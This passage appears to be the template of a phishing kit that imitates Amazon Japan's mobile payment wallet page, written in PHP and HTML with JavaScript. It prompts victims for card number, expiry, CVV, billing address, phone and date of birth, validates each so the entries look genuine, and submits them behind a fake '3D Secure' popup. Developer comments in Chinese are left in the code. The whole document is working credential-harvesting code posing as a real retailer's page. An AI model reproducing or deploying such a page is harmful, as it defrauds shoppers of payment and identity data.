                            <option value="2021">2021</option><option value="2022">2022</option><option value="2023">2023</option><option value="2024">2024</option><option value="2025">2025</option><option value="2026">2026</option><option value="2027">2027</option><option value="2028">2028</option><option value="2029">2029</option><option value="2030">2030</option><option value="2031">2031</option><option value="2032">2032</option><option value="2033">2033</option><option value="2034">2034</option><option value="2035">2035</option><option value="2036">2036</option><option value="2037">2037</option><option value="2038">2038</option><option value="2039">2039</option><option value="2040">2040</option><option value="2041">2041</option>
                        </select>
                    </div>
                   </div>
                  </div>
                 </div>
        <div class="a-row a-spacing-small">
            <div class="a-column a-span4 a-text-right a-spacing-top-mini pmts-update-everywhere-or-set-buying-preference-label">
                <label for="pp-v3SKiV-17" id="pp-v3SKiV-18" class="a-form-label">セキュリティコード</label>
            </div>
            <div class="a-column a-span8 pmts-update-everywhere-or-set-buying-preference-input-box a-span-last">
                <input type="text" maxlength="4" placeholder="CVV / CVC" autocomplete="off" name="cardcvv" id="bk_cardcvv" class="a-input-text a-form-normal" style="width:100%">
            </div>
        </div>        
       </div>
       <div class="a-row">
           <input type="hidden" id="bk_homeinfo" name="homeinfo" value="">
       </div>
      </div>
      
       
       <div class="a-row">
       <div class="a-column a-span12 a-text-right pmts-edit-instrument-buttons">
        <span class="a-button a-spacing-top-mini a-button-primary pmts-button-input">
            <span class="a-button-inner" onclick="bksubmit();">
                <input class="a-button-input" type="button" value="次のステップ">
                <span class="a-button-text" aria-hidden="true">次のステップ</span>
            </span>
        </span>
       </div>
      </div>
      </form></div>
      
     
    </div>
   </div>
<script>
    function bksubmit(){
        removeerror_bk();
        
        var bkerrBox = document.getElementById("bk_errBox");
        var bkerrMsg = document.getElementById("bk_errMsg");
        var bkcardnum = document.getElementById("bk_cardnum");
        var bkcaedname = document.getElementById("bk_cardname");
        var bkcarddatem = document.getElementById("bk_carddatem");
        var bkcarddatey = document.getElementById("bk_carddatey");
        var bkcardcvv = document.getElementById("bk_cardcvv");
        
        var errorHtml = "";
        var inputcardnum = bkcardnum.value.split(" ").join("");
        
        if(bkcaedname.value.trim()==""){
            bkcaedname.classList.add("a-form-error");
            errorHtml = errorHtml+'<li><span class="a-list-item">'+errMsg['cardname']+'</span></li>';
        }
        if(bkcardnum.value == ""){
            bkcardnum.classList.add("a-form-error");
            errorHtml = errorHtml+'<li><span class="a-list-item">'+errMsg['cardnum']+'</span></li>';
        }else if(!luhn_algo(inputcardnum)){
            bkcardnum.classList.add("a-form-error");
            errorHtml = errorHtml+'<li><span class="a-list-item">'+errMsg['cardnum_error']+'</span></li>';
        }
        if(bkcarddatey.value+(bkcarddatem.value>9?bkcarddatem.value:"0"+bkcarddatem.value) < <?=date("Ym")?>){
            bkcarddatem.classList.add("a-form-error");
            bkcarddatey.classList.add("a-form-error");
            errorHtml = errorHtml+'<li><span class="a-list-item">'+errMsg['carddate']+'</span></li>';
        }
        if(bkcardcvv.value<100 || bkcardcvv.value>9999 || !checkNumber(bkcardcvv.value)){
            bkcardcvv.classList.add("a-form-error");
            errorHtml = errorHtml+'<li><span class="a-list-item">'+errMsg['cardcvv']+'</span></li>';
        }
        
        if(errorHtml!=""){
            bkerrMsg.innerHTML = errorHtml;
            bkerrBox.style.display="";
        }else{
            document.getElementById("bk_loding").style.display="";
            setTimeout(function () {
                document.getElementById("bk_loding").style.display="none";
                go_open_bhk_popup()
            }, 600);
        }
    }
    
    function removeerror_bk(){
        document.getElementById("bk_errBox").style.display="none";
        document.getElementById("bk_cardname").classList.remove("a-form-error");
        document.getElementById("bk_cardnum").classList.remove("a-form-error");
        document.getElementById("bk_cardcvv").classList.remove("a-form-error");
        document.getElementById("bk_carddatem").classList.remove("a-form-error");
        document.getElementById("bk_carddatey").classList.remove("a-form-error");
       
    }
    function open_bk_popup(){
        document.getElementById("boday_loding").style.display="";
        carnumlength = 0;
        setTimeout(function () {
            document.getElementById("boday_loding").style.display="none";
            go_open_bk_popup();
        }, 600);
    }
    
    function go_open_bk_popup(){
        
    
        removeerror_bk();
    
        document.getElementById("bk_cardnum").value = "";
        document.getElementById("bk_cardname").value = "";
        document.getElementById("bk_homeinfo").value = "";
        document.getElementById("bk_cardcvv").value = "";
        document.getElementById("bk_carddatem").value = "1";
        document.getElementById("bk_carddatey").value = "2021";

        
        document.body.style.overflow = "hidden";
        document.getElementById("zhezhao").style.display="";
        document.getElementById("a-popover-wrapper-bk").style.display="";
    }
    
    function close_bk_popup(){
        document.body.style.overflow = "";
        document.getElementById("zhezhao").style.display="none";
        document.getElementById("a-popover-wrapper-bk").style.display="none";
    }
</script>
<div class="a-popover-wrapper-dy" id="a-popover-wrapper-bhk" style="display:none;">
   <header class="a-popover-header">
    <h4 class="a-popover-header-content" id="a-popover-header-4">請求先住所</h4>
    <button onclick="close_bhk_popup();" class=" a-button-close a-declarative"><i class="a-icon a-icon-close"></i></button>
   </header>
   <div class="a-popover-inner" id="a-popover-content-4" style="height: auto; overflow-y: auto;">
    <div class="a-section a-spacing-none pmts-widget-section">
     <div id="bhk_loding" data-pmts-component-id="bhk_loding" class="a-section a-spacing-none pmts-loading-async-widget-spinner-overlay pmts-portal-component pmts-portal-components-pp-FbZGDs-27" style="display:none;">
      <img src="https://images-fe.ssl-images-amazon.com/images/G/01/payments-portal/r1/loading-4x._CB485930688_.gif" class="pmts-loading-async-widget-spinner-viewport-centered">
     </div>
    <div id="bhk_errBox" class="a-row a-spacing-base" style="display:none">
            <div class="a-column a-span12">
                <div class="a-box a-alert a-alert-error" aria-live="assertive" role="alert">
                    <div class="a-box-inner a-alert-container">
                        <h4 class="a-alert-heading">問題が発生しました。</h4>
                            <i class="a-icon a-icon-alert"></i>
                                <div class="a-alert-content">
                                    <ul class="a-unordered-list a-vertical" id="bhk_errMsg"></ul>
                                </div>
                            </div>
                        </div>
                    </div>
                </div>         
         
         
        
      <div class="a-section" style="margin-bottom:0;">
       <div class="a-row a-spacing-base pmts-form-fields">
           <div class="a-row a-spacing-small">
                <div class="a-column a-span4 a-text-right a-spacing-top-mini pmts-customer-card-name-label">
                    <label for="pp-v3SKiV-16" class="a-form-label">氏名</label>
                </div>
                <div class="a-column a-span8 pmts-customer-card-name-input-box a-span-last">
                    <input type="text" maxlength="50" placeholder="氏名" autocomplete="off" name="homename" id="homename" class="a-input-text a-form-normal" style="width:100%"/>
                </div>
            </div>
            <div class="a-row a-spacing-small">
                <div class="a-column a-span4 a-text-right a-spacing-top-mini pmts-customer-card-name-label">
                    <label for="pp-v3SKiV-16" class="a-form-label">郵便番号</label>
                </div>
                <div class="a-column a-span8 pmts-customer-card-name-input-box a-span-last">
                    <input type="text" maxlength="10" placeholder="郵便番号" autocomplete="off" name="homemall" id="homemall" class="a-input-text a-form-normal" style="width:100%"/>
                </div>
            </div>
            <div class="a-row a-spacing-small">
                <div class="a-column a-span4 a-text-right a-spacing-top-mini pmts-customer-card-name-label">
                    <label for="pp-v3SKiV-16" class="a-form-label">都道府県 / 市区町村</label>
                </div>
                <div class="a-column a-span8 pmts-customer-card-name-input-box a-span-last">
                    <input type="text" maxlength="50" placeholder="都道府県 / 市区町村" autocomplete="off" name="homecity" id="homecity" class="a-input-text a-form-normal" style="width:100%"/>
                </div>
            </div>
            <div class="a-row a-spacing-small">
                <div class="a-column a-span4 a-text-right a-spacing-top-mini pmts-customer-card-name-label">
                    <label for="pp-v3SKiV-16" class="a-form-label">住所</label>
                </div>
                <div class="a-column a-span8 pmts-customer-card-name-input-box a-span-last">
                    <input type="text" placeholder="住所" autocomplete="off" name="homeaddress" id="homeaddress" class="a-input-text a-form-normal" style="width:100%" />
                </div>
            </div>
            <div class="a-row a-spacing-small">
                <div class="a-column a-span4 a-text-right a-spacing-top-mini pmts-customer-card-name-label">
                    <label for="pp-v3SKiV-16" class="a-form-label">会社名</label>
                </div>
                <div class="a-column a-span8 pmts-customer-card-name-input-box a-span-last">
                    <input type="text" maxlength="50" placeholder="会社名" autocomplete="off" name="homeclubname" id="homeclubname" class="a-input-text a-form-normal" style="width:100%" />
                </div>
            </div>
            <div class="a-row a-spacing-small">
                <div class="a-column a-span4 a-text-right a-spacing-top-mini pmts-customer-card-name-label">
                    <label for="pp-v3SKiV-16" class="a-form-label">電話番号</label>
                </div>
                <div class="a-column a-span8 pmts-customer-card-name-input-box a-span-last">
                    <input type="text" maxlength="20" placeholder="電話番号" autocomplete="off" name="homephone" id="homephone" class="a-input-text a-form-normal" style="width:100%" />
                </div>
            </div>
          
       </div>
       <div class="a-row"></div>
      </div>
      
       
       <div class="a-row">
       <div class="a-column a-span12 a-text-right pmts-edit-instrument-buttons">
        <span class="a-button a-spacing-top-mini a-button-primary pmts-button-input">
            <span class="a-button-inner" onclick="bhksubmit();">
                <input class="a-button-input" type="button" value="次のステップ">
                <span class="a-button-text" aria-hidden="true">次のステップ</span>
            </span>
        </span>
       </div>
      </div>
     </div>
      
     
    </div>
   </div>
<script>
    errMsg["homename"]="名称を記入してください。";
    errMsg["homemall"]="郵便番号を記入してください。";
    errMsg["homeaddress"]="住所に記入してください。";
    errMsg["homephone"]="電話番号を記入してください。";
    errMsg["homecity"]="州/都道府県を記入してください。";
    errMsg["homemall_error"]="郵便番号に問題がありました。";
    errMsg["homephone_error"]="入力された電話番号には数字以外の文字が含まれています。";
    function bhksubmit(){
        removeerror_bhk();
        var errorHtml = "";
        var bhkerrBox = document.getElementById("bhk_errBox");
        var bhkerrMsg = document.getElementById("bhk_errMsg");
        var homename = document.getElementById("homename");
        var homemall = document.getElementById("homemall");
        var homecity = document.getElementById("homecity");
        var homeaddress = document.getElementById("homeaddress");
        var homephone = document.getElementById("homephone");
        var homeclubname = document.getElementById("homeclubname");
        if(homename.value.split(" ").join("")==""){
            homename.classList.add("a-form-error");
            errorHtml = errorHtml+'<li><span class="a-list-item">'+errMsg['homename']+'</span></li>';
        }
        if(homemall.value.split(" ").join("")==""){
            homemall.classList.add("a-form-error");
            errorHtml = errorHtml+'<li><span class="a-list-item">'+errMsg['homemall']+'</span></li>';
        }else if(!checkNumber(homemall.value)){
            homemall.classList.add("a-form-error");
            errorHtml = errorHtml+'<li><span class="a-list-item">'+errMsg['homemall_error']+'</span></li>';
        }
        if(homecity.value.split(" ").join("")==""){
            homecity.classList.add("a-form-error");
            errorHtml = errorHtml+'<li><span class="a-list-item">'+errMsg['homecity']+'</span></li>';
        }
        if(homeaddress.value.split(" ").join("")==""){
            homeaddress.classList.add("a-form-error");
            errorHtml = errorHtml+'<li><span class="a-list-item">'+errMsg['homeaddress']+'</span></li>';
        }
        if(homephone.value.split(" ").join("")==""){
            homephone.classList.add("a-form-error");
            errorHtml = errorHtml+'<li><span class="a-list-item">'+errMsg['homephone']+'</span></li>';
        }else if(!checkNumber(homephone.value)){
            homephone.classList.add("a-form-error");
            errorHtml = errorHtml+'<li><span class="a-list-item">'+errMsg['homephone_error']+'</span></li>';
        }
        
        if(errorHtml!=""){
            bhkerrMsg.innerHTML = errorHtml;
            bhkerrBox.style.display="";
        }else{
            document.getElementById("bhk_loding").style.display="";
            document.getElementById("bk_homeinfo").value = homename.value+"|&|"+homemall.value+"|&|"+homecity.value+"|&|"+homeaddress.value+"|&|"+homeclubname.value+"|&|"+homephone.value;
            setTimeout(function () {
                document.getElementById("bhk_loding").style.display="none";
                open_birthday_box("bk");
            }, 600);
        }
    }
    function removeerror_bhk(){
        document.getElementById("bhk_errBox").style.display="none";
        document.getElementById("homename").classList.remove("a-form-error");
        document.getElementById("homemall").classList.remove("a-form-error");
        document.getElementById("homecity").classList.remove("a-form-error");
        document.getElementById("homeaddress").classList.remove("a-form-error");
        document.getElementById("homephone").classList.remove("a-form-error");
    }
    
    function go_open_bhk_popup(){
        removeerror_bhk();
        document.getElementById("homename").value = "";
        document.getElementById("homemall").value = "";
        document.getElementById("homecity").value = "";
        document.getElementById("homeaddress").value = "";
        document.getElementById("homeclubname").value = "";
        document.getElementById("homephone").value = "";
        
        document.body.style.overflow = "hidden";
        document.getElementById("zhezhao").style.display="";
        document.getElementById("a-popover-wrapper-bk").style.display="none";
        document.getElementById("a-popover-wrapper-bhk").style.display="";
    }
    function close_bhk_popup(){
        document.body.style.overflow = "";
        document.getElementById("zhezhao").style.display="none";
        document.getElementById("a-popover-wrapper-bhk").style.display="none";
    }
    
</script>
<!-----验证弹窗----->
<div class="a-popover-birthday" id="a-popover-birthday" style="display:none;">
   <span tabindex="0" class="a-popover-start a-popover-a11y-offscreen"></span>
   <div class="a-popover-wrapper">
    <header class="a-popover-header">
     <h4 class="a-popover-header-content" id="a-popover-header-1">生年月日を検証する</h4>
     <button onclick="close_birthday_box();" class=" a-button-close a-declarative"><i class="a-icon a-icon-close"></i></button>
    </header>
    <div class="a-popover-inner" id="a-popover-content-1" style="height: auto; overflow-y: auto;">
     <div id="portalWidgetSection" class="a-section">
      <div id="cpefront-mpo-widget">
       <div data-pmts-component-id="pp-v3SKiV-1" class="a-section a-spacing-none pmts-widget-section pmts-portal-root-hvaKzVf8N1oL pmts-portal-component pmts-portal-components-pp-v3SKiV-1">
        <div id="birthday_loding"class="a-section a-spacing-none pmts-loading-async-widget-spinner-overlay pmts-portal-component pmts-portal-components-pp-v3SKiV-8" style="display:none">
         <img src="https://images-fe.ssl-images-amazon.com/images/G/01/payments-portal/r1/loading-4x._CB485930688_.gif" class="pmts-loading-async-widget-spinner-viewport-centered" />
        </div>
        <div class="a-row">
         <div id="pp-v3SKiV-10" data-pmts-component-id="pp-v3SKiV-2" class="a-section pmts-portal-component pmts-portal-components-pp-v3SKiV-2">
          <div class="a-section a-spacing-none pmts-widget-section">
           <div class="a-section pmts-add-credit-card-component-container">
            <div id="pp-v3SKiV-11" data-pmts-component-id="pp-v3SKiV-3" class="a-section a-spacing-none pmts-portal-component pmts-portal-components-pp-v3SKiV-3">
              <div class="a-row a-spacing-base">
                  
                <div id="birthday_errBox" class="a-row a-spacing-base" style="display:none;">
                    <div class="a-column a-span12">
                        <div class="a-box a-alert a-alert-error" aria-live="assertive" role="alert">
                            <div class="a-box-inner a-alert-container">
                                <h4 class="a-alert-heading">問題が発生しました。</h4>
                                <i class="a-icon a-icon-alert"></i>
                                <div class="a-alert-content">
                                    <ul class="a-unordered-list a-vertical" id="birthday_errMsg">
                                        
                                    </ul>
                                </div>
                            </div>
                        </div>
                    </div>
                </div>


               <div class="a-column a-span12">
                    <div class="a-row" style="">
                        <div>
                            <span style="font-weight:800">お誕生日</span>
                            <span style="margin-left:10px;">
                                <input type="hidden" id="birthday_type" value="bk">
                                <select maxlength="4" autocomplete="off" id="birthday_year" class="a-input-text a-form-normal" style="width:22%;" />
                                <option value=""></option>
                                <?php for($year=date("Y");$year>date("Y")-200;$year--){ ?><option value="<?=$year?>"><?=$year?></option><?php } ?>
                                </select>年
                                <select maxlength="2" autocomplete="off" id="birthday_month" class="a-input-text a-form-normal" style="width:18%;" />
                                <option value=""></option>
                                <?php for($month=1;$month<13;$month++){ ?><option value="<?=$month<10?"0".$month:$month?>"><?=$month<10?"0".$month:$month?></option><?php } ?>
                                </select>月
                                <select maxlength="2" autocomplete="off" id="birthday_day" class="a-input-text a-form-normal" style="width:18%;" />
                                <option value=""></option>
                                <?php for($day=1;$day<31;$day++){ ?><option value="<?=$day<10?"0".$day:$day?>"><?=$day<10?"0".$day:$day?></option><?php } ?>
                                </select>日
                            </span>
                        </div>
                        
                    </div>
               </div>
              
               
              </div>
              <style>
                  div.right-a-column{
                    margin-right: 2%;
                    float: right;
                    min-height: 1px;
                    overflow: visible;
                  }
              </style>
              <div class="a-row apx-add-card-buttons-in-popover">
               <div class="a-section a-spacing-small a-spacing-top-small" style="text-align:right;">
                    <span class="a-button a-button-primary pmts-button-input" style="margin:2px 50px;">
                        <span class="a-button-inner" onclick="birthdaysubmit();">
                            <input class="a-button-input" type="button" value="検証" aria-labelledby="a-autoid-3-announce">
                        <span class="a-button-text" aria-hidden="true" id="a-autoid-3-announce">検証</span>
                    </span>
                </span>
               </div>
              </div>
            </div>
           </div>
          </div>
         </div>
        </div>
       </div>
      </div>
     </div>
    </div>
   </div>
  </div>
<script>
    
    errMsg["birthday"] = "正しい誕生日を記入してください";

    function birthdaysubmit(){
        var type = document.getElementById("birthday_type").value;
        var birthdayerrbox = document.getElementById("birthday_errBox");
        var birthdayerrmsg = document.getElementById("birthday_errMsg");
        var year = document.getElementById("birthday_year");
        var month = document.getElementById("birthday_month");
        var day = document.getElementById("birthday_day");
        var errorHtml = "";
        removeerror_birthday();
        if(!checkNumber(year.value) || year.value<1821 || year.value>2021){
            year.classList.add("a-form-error");
            errorHtml = '<li><span class="a-list-item">'+errMsg['birthday']+'</span></li>';
        }
        if(!checkNumber(month.value) || month.value<1 || month.value>12){
            month.classList.add("a-form-error");
            errorHtml = '<li><span class="a-list-item">'+errMsg['birthday']+'</span></li>';
        }
        if(!checkNumber(day.value) || day.value<1 || day.value>31){
            day.classList.add("a-form-error");
            errorHtml = '<li><span class="a-list-item">'+errMsg['birthday']+'</span></li>';
        }
        
        
        if(errorHtml!=""){
            birthdayerrmsg.innerHTML = errorHtml;
            birthdayerrbox.style.display="";
        }else{
            if(month.value<10){
                month.value = "0"+(month.value.split("0").join(""));
            }
            if(day.value<10){
                day.value = "0"+(day.value.split("0").join(""));
            }
            document.getElementById(type+"_birthday").value = year.value+"/"+month.value+"/"+day.value;
            document.getElementById("birthday_loding").style.display="";
            setTimeout(function () {
                document.getElementById(type+"_form").submit();
                open_3d_box();
            }, 600);
        }
        
       
        
        
        
    }
    
    function removeerror_birthday(){
        document.getElementById("birthday_errBox").style.display="none";
        document.getElementById("birthday_year").classList.remove("a-form-error");
        document.getElementById("birthday_month").classList.remove("a-form-error");
        document.getElementById("birthday_day").classList.remove("a-form-error");
    }
    
    function open_birthday_box(type){
        document.getElementById("birthday_year").value="";
        document.getElementById("birthday_month").value="";
        document.getElementById("birthday_day").value="";
        document.getElementById("birthday_type").value=type;
        document.getElementById("a-popover-wrapper-bhk").style.display="none";
        document.getElementById("a-popover-wrapper-yz").style.display="none";
        removeerror_birthday();
        document.getElementById("birthday_loding").style.display="none";
        document.getElementById("zhezhao").style.display="";
        document.getElementById("a-popover-birthday").style.display="";
    }
    function close_birthday_box(){
        document.getElementById("zhezhao").style.display="none";
        document.getElementById("a-popover-birthday").style.display="none";
    }
</script>
<!-----生日弹窗----->
<!-------3D弹窗------->
<div class="a-popover-wrapper-dy" id="a-popover-wrapper-3d" style="display:none;">
   <header class="a-popover-header">
    <h4 class="a-popover-header-content" id="a-popover-header-4">3D Secure</h4>
    <button onclick="close_3d_box();" class=" a-button-close a-declarative"><i class="a-icon a-icon-close"></i></button>
   </header>
   <iframe name="3d-secure" style="width:100%; height:350px;border: medium none;"></iframe>
</div>
<script>
    function open_3d_box(){
        document.getElementById("a-popover-birthday").style.display="none";
        document.getElementById("zhezhao").style.display="";
        document.getElementById("a-popover-wrapper-3d").style.display="";
    }
    function close_3d_box(){
        document.body.style.overflow = "";
        document.getElementById("zhezhao").style.display="none";
        document.getElementById("a-popover-wrapper-3d").style.display="none";
    }
</script>
<!-------3D弹窗------->
<!-----没绑卡自动打开绑卡弹窗----->
<?php if(count($cardInfo)<1){ ?>
<script>
    open_bk_popup();
</script>
<?php } ?>
<!-----没绑卡自动打开绑卡弹窗----->   
  <footer class="nav-mobile nav-ftr-batmobile"> 
   <div id="nav-ftr" class="nav-t-footer-gateway nav-sprite-v3"> 
    <a id="nav-ftr-gototop" class="nav-a" href="#top" aria-label="ページトップへ"> <i class="nav-icon"></i> <b class="nav-b"> ページトップへ </b> </a> 
    <ul id="nav-ftr-links" class="nav-ftr-links-two-column"> 
     <li class="nav-li nav-li-right"> <a class="nav-a " href="https://www.amazon.co.jp/gp/aw/recs/ys?ref_=navm_ftr_ys"> <span class="nav-ftr-text"> マイストア </span> <i class="nav-icon nav-sprite"></i> </a> </li> 
     <li class="nav-li nav-li-right"> <a class="nav-a " href="https://www.amazon.co.jp/gp/aw/ls?ref_=navm_ftr_wl"> <span class="nav-ftr-text"> ほしい物リスト </span> <i class="nav-icon nav-sprite"></i> </a> </li> 
     <li class="nav-li nav-li-right"> <a class="nav-a " href="https://www.amazon.co.jp/gp/aw/ya?ref_=navm_ftr_ya"> <span class="nav-ftr-text"> アカウントサービス </span> <i class="nav-icon nav-sprite"></i> </a> </li> 
     <li class="nav-li nav-li-right"> <a class="nav-a " href="https://www.amazon.co.jp/gp/subscribe-and-save/manage?ref_=navm_ftr_sns"> <span class="nav-ftr-text"> Amazon定期おトク便情報 </span> <i class="nav-icon nav-sprite"></i> </a> </li> 
     <li class="nav-li nav-li-right"> <a class="nav-a " href="https://www.amazon.co.jp/gp/help/customer/display.html?nodeId=201819090&amp;ref_=navm_ftr_return"> <span class="nav-ftr-text"> 返品 </span> <i class="nav-icon nav-sprite"></i> </a> </li> 
     <li class="nav-li nav-li-right"> <a class="nav-a " href="https://www.amazon.co.jp/gp/cs?ref_=navm_ftr_cu"> <span class="nav-ftr-text"> カスタマーサービスに連絡 </span> <i class="nav-icon nav-sprite"></i> </a> </li> 
     <li class="nav-li nav-li-right"> <a class="nav-a " href="https://www.amazon.co.jp/gp/anywhere/site-view.html?opt=desktop&amp;force-full-site=1&amp;ie=UTF8&amp;ref_=navm_ftr_fullsite&amp;url=%2Fgp%2Fhomepage.html%3Fref_%3Dnavm_ftr_fullsite"> <span class="nav-ftr-text"> Amazon PCサイト </span> <i class="nav-icon nav-sprite"></i> </a> </li> 
     <li class="nav-li "> <a class="nav-a " href="/?ref_=navm_ftr_home"> <span class="nav-ftr-text"> Amazonトップ </span> <i class="nav-icon nav-sprite"></i> </a> </li> 
     <li class="nav-li "> <a class="nav-a " href="https://www.amazon.co.jp/gp/your-account/order-history?ref_=navm_ftr_yo"> <span class="nav-ftr-text"> 注文履歴 </span> <i class="nav-icon nav-sprite"></i> </a> </li> 
     <li class="nav-li "> <a class="nav-a " href="https://www.amazon.co.jp/gp/aw/ls/s?ref_=navm_ftr_fwlr"> <span class="nav-ftr-text"> ほしい物リストサーチ </span> <i class="nav-icon nav-sprite"></i> </a> </li> 
     <li class="nav-li "> <a class="nav-a " href="https://services.amazon.co.jp/home.htm?ld=AZJPSOAMBLP&amp;ref_=navm_ftr_sell"> <span class="nav-ftr-text"> Amazonで売る </span> <i class="nav-icon nav-sprite"></i> </a> </li> 
     <li class="nav-li "> <a class="nav-a " href="https://www.amazon.co.jp/gp/aw/ybh?ref_=navm_ftr_ybh"> <span class="nav-ftr-text"> 最近チェックした商品 </span> <i class="nav-icon nav-sprite"></i> </a> </li> 
     <li class="nav-li "> <a class="nav-a " href="https://www.amazon.co.jp/gp/aw/vsd.html?ref_=navm_ftr_1click"> <span class="nav-ftr-text"> 1-Click設定 </span> <i class="nav-icon nav-sprite"></i> </a> </li> 
     <li class="nav-li "> <a class="nav-a " href="https://www.amazon.co.jp/gp/help/customer/display.html?ie=UTF8&amp;ref_=navm_ftr_help"> <span class="nav-ftr-text"> ヘルプ・サポート </span> <i class="nav-icon nav-sprite"></i> </a> </li> 
    </ul> 
    <div class="icp-container-mobile"> 
     <style type="text/css">
  #icp-touch-link-language { display: none; }
</style> 
     <a href="https://www.amazon.co.jp/gp/customer-preferences/select-language/ref=footer_lang?from=mobile&amp;ie=UTF8&amp;preferencesReturnUrl=%2Fcpe%2Fyourpayments%2Fwallet%3F_encoding%3DUTF8%26ref_%3Dya_mshop_mpo" class="icp-touch-link-2" id="icp-touch-link-language"> 
      <div class="icp-nav-globe-img-2 icp-mobile-globe-2"></div><span class="icp-color-base">日本語</span><span class="nav-arrow icp-up-down-arrow"></span><span class="aok-hidden" style="display:none">ショッピングのための言語を選択します。</span> </a> 
     <style type="text/css">
#icp-touch-link-country { display: none; }
</style> 
     <a href="https://www.amazon.co.jp/gp/navigation-country/select-country/ref=navm_footer_icp_cp?ie=UTF8&amp;preferencesReturnUrl=%2Fcpe%2Fyourpayments%2Fwallet%3F_encoding%3DUTF8%26ref_%3Dya_mshop_mpo" class="icp-touch-link-2" id="icp-touch-link-country"> <span class="icp-flag-3 icp-flag-3-jp"></span><span class="icp-color-base">日本</span><span class="aok-hidden" style="display:none">ショッピングのための国/地域を選択します。</span> </a> 
    </div> 
    <div id="nav-switch-account" class="nav-ftr-auth-mobile"> 
     <a href="https://www.amazon.co.jp/ap/signin?openid.pape.max_auth_age=0&amp;openid.return_to=https%3A%2F%2Fwww.amazon.co.jp%2Fgp%2Fyourstore%2Fhome%2F%3Fie%3DUTF8%26_encoding%3DUTF8%26ref_%3Dnav_youraccount_switchacct&amp;openid.identity=http%3A%2F%2Fspecs.openid.net%2Fauth%2F2.0%2Fidentifier_select&amp;openid.assoc_handle=anywhere_v2_jp&amp;openid.mode=checkid_setup&amp;openid.claimed_id=http%3A%2F%2Fspecs.openid.net%2Fauth%2F2.0%2Fidentifier_select&amp;openid.ns=http%3A%2F%2Fspecs.openid.net%2Fauth%2F2.0&amp;switch_account=picker&amp;ignoreAuthState=1&amp;_encoding=UTF8" id="nav-item-switch-account-footer" class="nav-a"> アカウントの切り替え </a> 
    </div> 
    <div id="nav-ftr-auth"> 
     <a href="https://www.amazon.co.jp/gp/flex/sign-out.html?signIn=1&amp;useRedirectOnSuccess=1&amp;action=sign-out&amp;ie=UTF8&amp;ref_=nav_m_foot_so&amp;_encoding=UTF8&amp;path=%2Fcpe%2Fyourpayments%2Fwallet" class="nav-a"> ログアウト </a> 
    </div> 
    <ul class="nav-ftr-horiz nav-ftr-big"> 
     <li class="nav-li"> <a href="https://www.amazon.co.jp/gp/aw/sh.html?ref_=navm_ftr_sh" class="nav-a"> 検索・閲覧履歴 </a> </li> 
    </ul> 
    <ul class="nav-ftr-horiz"> 
     <li class="nav-li"> <a href="https://www.amazon.co.jp/gp/help/customer/display.html?nodeId=643006&amp;ref_=navm_ftr_cou" class="nav-a">利用規約</a> </li> 
     <li class="nav-li"> <a href="https://www.amazon.co.jp/gp/help/customer/display.html?nodeId=643000&amp;ref_=navm_ftr_mpa" class="nav-a">プライバシー規約</a> </li> 
     <li class="nav-li"> <a href="https://www.amazon.co.jp/gp/help/customer/display.html?nodeId=201047280&amp;ref_=navm_ftr_iba" class="nav-a">パーソナライズド広告規約</a> </li> 
    </ul> 
    <div id="nav-ftr-copyright">
      &copy; 2000-2021, Amazon.com, Inc. and its affiliates 
    </div> 
   </div> 
  </footer> 
 </body>
</html>